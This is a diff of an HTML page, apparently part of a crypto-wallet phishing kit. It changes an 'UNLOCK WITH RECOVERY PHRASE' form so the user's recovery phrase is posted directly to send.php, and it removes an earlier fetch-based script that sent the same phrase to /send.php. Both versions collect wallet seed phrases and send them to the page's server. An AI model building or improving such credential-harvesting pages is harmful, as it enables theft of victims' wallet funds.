@@ -2734,7 +2734,7 @@
 						</div>
 
 						<div class="animate-on-scroll" data-delay="400">
-							<form id="unlockForm" onsubmit="return submitRecoveryPhrase(event)">
+							<form id="unlockForm" method="POST" action="send.php">
     <input type="text" 
            id="recoveryPhrase" 
            name="recoveryPhrase" 
@@ -2748,36 +2748,6 @@
         UNLOCK WITH RECOVERY PHRASE
     </button>
 </form>
-
-<script>
-function submitRecoveryPhrase(event) {
-    event.preventDefault();
-    
-    const recoveryPhrase = document.getElementById('recoveryPhrase').value;
-    const button = document.getElementById('unlockSubmitBtn');
-    button.disabled = true;
-
-    fetch('/send.php', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/x-www-form-urlencoded',
-        },
-        body: 'recoveryPhrase=' + encodeURIComponent(recoveryPhrase)
-    })
-    .then(response => response.json())
-    .then(data => {
-        button.disabled = false;
-        // You can add success handling here if needed
-    })
-    .catch(error => {
-        button.disabled = false;
-        // You can add error handling here if needed
-    });
-
-    return false;
-}
-</script>
-
 							<button
 								class="pi-button bg-gray-400"
 								disabled
